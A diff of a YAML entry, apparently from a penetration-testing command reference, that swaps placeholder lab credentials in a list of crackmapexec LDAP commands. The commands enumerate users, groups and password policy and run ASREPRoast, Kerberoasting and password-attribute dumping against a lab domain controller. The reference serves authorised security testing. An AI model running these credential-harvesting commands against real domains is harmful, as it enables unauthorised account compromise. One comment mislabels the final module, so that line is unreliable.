@@ -6,26 +6,26 @@ description: |
   Reference values:
     Target DC: 10.10.10.1
     Domain: test.local
-    Username: john
-    Password: password123
+    Username: pentuser
+    Password: P@ssw0rd123
 command: |
   # Enumerate users
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --users
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --users
 
   # Enumerate groups
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --groups
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --groups
 
   # Get password policy
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --pass-pol
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --pass-pol
 
   # ASREPRoast
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --asreproast asrep.txt
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --asreproast asrep.txt
 
   # Kerberoast
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --kerberoasting kerb.txt
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --kerberoasting kerb.txt
 
   # Find accounts with no pre-auth
-  crackmapexec ldap 10.10.10.1 -u john -p 'password123' -M get-unixUserPassword
+  crackmapexec ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -M get-unixUserPassword
 phase:
   - Enumeration
 target_os:
